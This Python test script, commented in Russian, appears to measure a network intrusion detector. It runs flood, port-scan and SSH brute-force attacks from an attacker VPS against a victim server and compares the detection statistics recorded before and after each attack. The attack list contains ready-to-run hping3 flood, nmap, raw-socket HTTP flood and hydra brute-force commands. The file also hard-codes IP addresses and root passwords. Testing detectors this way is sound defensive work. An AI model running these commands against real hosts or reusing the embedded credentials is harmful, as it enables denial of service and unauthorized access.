"""
Пофазовый тест Stage4 — сбор статистики через /api/debug/stats напрямую с ПК.
Каждая атака: snapshot_before → атака → ждём → snapshot_after → delta.
"""
from __future__ import annotations

import io
import json
import sys
import time
import urllib.request
from copy import deepcopy
from dataclasses import dataclass, field

import paramiko

if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

# ── Конфигурация ────────────────────────────────────────────────
VICTIM_IP   = "72.56.236.144"
VICTIM_PASS = "y,D+W1Hv35s41F"
VICTIM_API  = f"http://{VICTIM_IP}:8000"

ATTACKER_IP   = "193.233.91.180"
ATTACKER_USER = "root"
ATTACKER_PASS = "r56Ul1mMFS91"

ATTACK_DURATION = 45   # секунд каждая атака
SETTLE_TIME     = 30   # секунд ждём после окончания атаки для завершения потоков
UNBLOCK_WAIT    = 6    # секунд после разблокировки

# ── Атаки: (название, команда на attacker, ожид. класс) ─────────
# SYN/UDP/ICMP: умеренный rate (--faster не --flood) чтобы не убивать API
ATTACKS = [
    # SYN flood ~5000 pps — достаточно для детекции, не убивает uvicorn
    ("SYN Flood",
     f"timeout {ATTACK_DURATION} hping3 -S -p 80 --faster -c 150000 {VICTIM_IP} 2>&1 | tail -3 || true",
     "DoS"),
    # UDP flood
    ("UDP Flood",
     f"timeout {ATTACK_DURATION} hping3 --udp -p 53 --faster -c 100000 {VICTIM_IP} 2>&1 | tail -3 || true",
     "DoS/DDoS"),
    # ICMP flood
    ("ICMP Flood",
     f"timeout {ATTACK_DURATION} hping3 --icmp --faster -c 100000 {VICTIM_IP} 2>&1 | tail -3 || true",
     "DoS"),
    # Port scan через nmap
    ("Port Scan",
     f"nmap -sS -p 1-10000 --min-rate 2000 -T5 {VICTIM_IP} 2>&1 | tail -5",
     "Recon"),
    # HTTP flood на порт 80 (nginx/any open port), не порт 8000 (API)
    ("HTTP Flood",
     f"timeout {ATTACK_DURATION} python3 -c \""
     f"import socket,time; t=time.time(); n=0\n"
     f"while time.time()-t<{ATTACK_DURATION}:\n"
     f" try:\n"
     f"  s=socket.socket(); s.settimeout(2); s.connect(('{VICTIM_IP}',80))\n"
     f"  s.send(b'GET /index.html HTTP/1.1\\r\\nHost: {VICTIM_IP}\\r\\n\\r\\n')\n"
     f"  s.recv(128); s.close(); n+=1\n"
     f" except: pass\n"
     f"print(n,'http requests')\" 2>&1 || true",
     "DoS/WebAttack"),
    # SSH BruteForce через hydra (уже установлен)
    ("SSH BruteForce",
     f"timeout {ATTACK_DURATION} hydra -l root "
     f"-P /usr/share/wordlists/rockyou.txt "
     f"-t 8 -s 22 -I {VICTIM_IP} ssh 2>&1 | tail -5 || "
     f"timeout {ATTACK_DURATION} hydra -l root -x 4:4:a "
     f"-t 8 -s 22 -I {VICTIM_IP} ssh 2>&1 | tail -5 || true",
     "BruteForce"),
]


# ── Вспомогательные функции ──────────────────────────────────────
def get_stats() -> dict:
    try:
        resp = urllib.request.urlopen(f"{VICTIM_API}/api/debug/stats", timeout=8)
        return json.loads(resp.read())
    except Exception as e:
        print(f"  [stats error] {e}")
        return {}


def delta_stats(before: dict, after: dict) -> dict:
    """Вычисляет разницу между двумя снапшотами статистики."""
    d_total = after.get("uptime_events_total", 0) - before.get("uptime_events_total", 0)
    d_labels: dict[str, int] = {}
    for lbl in ("normal", "warning", "anomaly"):
        d_labels[lbl] = (after.get("events_by_label", {}).get(lbl, 0)
                         - before.get("events_by_label", {}).get(lbl, 0))
    d_classes: dict[str, int] = {}
    all_classes = set(after.get("events_by_attack_class", {}).keys()) | \
                  set(before.get("events_by_attack_class", {}).keys())
    for cls in all_classes:
        d_classes[cls] = (after.get("events_by_attack_class", {}).get(cls, 0)
                          - before.get("events_by_attack_class", {}).get(cls, 0))
    d_classes = {k: v for k, v in d_classes.items() if v > 0}
    # Attacker src IP delta
    d_attacker = (after.get("top_src_ips", {}).get(ATTACKER_IP, 0)
                  - before.get("top_src_ips", {}).get(ATTACKER_IP, 0))
    return {
        "total": d_total,
        "labels": d_labels,
        "classes": d_classes,
        "attacker_flows": d_attacker,
    }


def ssh_victim(cmd: str, timeout: int = 20) -> str:
    """Выполняет команду на сервере жертвы."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for _ in range(3):
        try:
            client.connect(VICTIM_IP, username="root", password=VICTIM_PASS, timeout=10)
            break
        except Exception:
            time.sleep(4)
    else:
        return "SSH FAILED"
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode("utf-8", errors="replace")
    client.close()
    return out.strip()


def unblock_attacker() -> None:
    """Убирает блокировку атакующего IP на жертве."""
    result = ssh_victim(f"iptables -D INPUT -s {ATTACKER_IP} -j DROP 2>&1 || echo 'not blocked'")
    if "not blocked" in result or "Bad rule" in result or result == "":
        print(f"  > Attacker not blocked (already clear)")
    else:
        print(f"  > Unblocked {ATTACKER_IP}")


def run_attack_on_attacker(cmd: str, name: str) -> None:
    """SSH на атакующий VPS и запускает команду (неблокирующий)."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ATTACKER_IP, username=ATTACKER_USER, password=ATTACKER_PASS, timeout=12)
        print(f"  > [SSH→{ATTACKER_IP}] Running: {name} ...")
        # Запускаем и ждём завершения (команда уже содержит timeout)
        stdin, stdout, stderr = client.exec_command(cmd, timeout=ATTACK_DURATION + 30)
        out = stdout.read().decode("utf-8", errors="replace")
        if out.strip():
            print(f"  > Output: {out.strip()[:200]}")
        client.close()
        print(f"  > {name} done")
    except Exception as e:
        print(f"  > [!!] Attack SSH error: {e}")


# ── Основной тест ────────────────────────────────────────────────
def main():
    print("=" * 60)
    print("Stage4 Per-Attack Test")
    print(f"Target: {VICTIM_IP} | Attacker: {ATTACKER_IP}")
    print(f"Model: catboost-cascade-advanced2 | Mode: advanced")
    print("=" * 60)

    # Проверяем доступность API
    stats0 = get_stats()
    if not stats0:
        print("[FAIL] Cannot reach API")
        return
    print(f"\n[OK] API reachable. Current total events: {stats0.get('uptime_events_total', 0)}")

    results = []

    for attack_name, attack_cmd, expected_class in ATTACKS:
        print(f"\n{'─'*60}")
        print(f"АТАКА: {attack_name}  (ожидаем: {expected_class})")
        print(f"{'─'*60}")

        # 1. Разблокируем атакующего
        unblock_attacker()
        time.sleep(UNBLOCK_WAIT)

        # 2. Baseline до атаки
        before = get_stats()
        print(f"  > Baseline: total={before.get('uptime_events_total', 0)}, "
              f"attacker_events={before.get('top_src_ips', {}).get(ATTACKER_IP, 0)}")

        # 3. Запускаем атаку
        run_attack_on_attacker(attack_cmd, attack_name)

        # 4. Ждём пока потоки завершатся
        print(f"  > Waiting {SETTLE_TIME}s for flows to complete...")
        time.sleep(SETTLE_TIME)

        # 5. После атаки
        after = get_stats()
        d = delta_stats(before, after)

        print(f"\n  РЕЗУЛЬТАТ:")
        print(f"  Новых событий всего:    {d['total']}")
        print(f"  От атакующего IP:       {d['attacker_flows']}")
        print(f"  По типу:  anomaly={d['labels'].get('anomaly',0)}  "
              f"warning={d['labels'].get('warning',0)}  normal={d['labels'].get('normal',0)}")
        if d['classes']:
            print(f"  Классы:   {d['classes']}")
        else:
            print(f"  Классы:   (нет / все Benign)")

        # Оценка
        attack_detected = d['labels'].get('anomaly', 0) + d['labels'].get('warning', 0) > 0
        class_match = expected_class.split("/")[0] in " ".join(d['classes'].keys())
        print(f"  Детекция: {'✅' if attack_detected else '❌'}  "
              f"Класс: {'✅' if class_match else '❌ (ожидалось ' + expected_class + ')'}")

        results.append({
            "attack": attack_name,
            "expected_class": expected_class,
            "total_new_events": d["total"],
            "attacker_flows": d["attacker_flows"],
            "anomaly": d["labels"].get("anomaly", 0),
            "warning": d["labels"].get("warning", 0),
            "normal": d["labels"].get("normal", 0),
            "detected_classes": d["classes"],
            "detection_ok": attack_detected,
            "class_ok": class_match,
        })

    # ── Итоговая таблица ──────────────────────────────────────────
    print("\n" + "=" * 60)
    print("ИТОГОВАЯ ТАБЛИЦА — Advanced2 (Stage1+Stage4)")
    print("=" * 60)
    print(f"{'Атака':18s} | {'Детекция':8s} | {'Класс':8s} | {'Events':6s} | {'Классы обнаружены'}")
    print("-" * 80)
    for r in results:
        det = "✅ 100%" if r["detection_ok"] else "❌ 0%"
        cls = "✅" if r["class_ok"] else "❌"
        classes_str = ", ".join(f"{k}={v}" for k, v in r["detected_classes"].items()) or "—"
        print(f"{r['attack']:18s} | {det:8s} | {cls:8s} | {r['total_new_events']:6d} | {classes_str}")

    # Сохраняем JSON
    out_path = "report_advanced2_per_attack.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\n[OK] Saved → {out_path}")


if __name__ == "__main__":
    main()
